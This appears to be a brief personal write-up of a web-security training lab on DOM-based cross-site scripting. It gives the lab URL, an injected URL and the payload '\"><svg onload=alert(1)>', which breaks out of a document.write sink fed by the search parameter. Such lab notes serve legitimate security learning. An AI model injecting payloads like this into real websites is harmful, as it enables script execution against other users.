# Lab: DOM XSS in document.write sink using source location.search

*5/19/2026*

**Base URL:**
https://0ac5009e03009be980ae5dd9004f0086.web-security-academy.net/ 

**Vulnerable URL:**
https://0ac5009e03009be980ae5dd9004f0086.web-security-academy.net/ 

**Injected URL:**
https://0ac5009e03009be980ae5dd9004f0086.web-security-academy.net/?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E 

**Note:**
``"><svg onload=alert(1)>`` 

The web page is vulnerable to attacks via the search bar where a script can be used to call upon javascript code due to the document.write function in the code. By putting a `“` in the search bar, followed by javascript code, the command is executed on the website.
